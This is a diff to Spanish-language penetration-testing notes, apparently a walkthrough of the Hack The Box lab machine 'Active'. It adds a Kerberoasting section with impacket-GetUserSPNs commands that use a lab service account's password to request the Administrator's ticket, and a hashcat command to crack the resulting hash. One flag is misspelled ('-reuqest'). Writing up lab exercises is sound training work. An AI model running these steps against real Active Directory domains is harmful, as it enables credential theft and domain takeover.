@@ -112,4 +112,18 @@ impacket-GetNPUsers active.htb/ -no-pass -usersfile users.txt
 
 
 ## Kerberoasting
-Al tener un usuario y contraseña validas vamos a realizar [[Kerberoasting]], para obtener un `TGS (T`
+Al tener un usuario y contraseña validas vamos a realizar [[Kerberoasting]], para obtener un `TGS (Ticket Granting Service)` usaremos [[IMPACKET]]
+```shell
+impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18
+```
+
+Obtenemos el `SPN` del usuario `Administrador` por lo cual podemos solicitar su ticket usando
+```shell
+impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -reuqest
+```
+
+EL `hash` obtenido lo pasamos a un fichero y podemos crackearlo usando [[HASHCAT]]
+```shell
+hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt 
+```
+
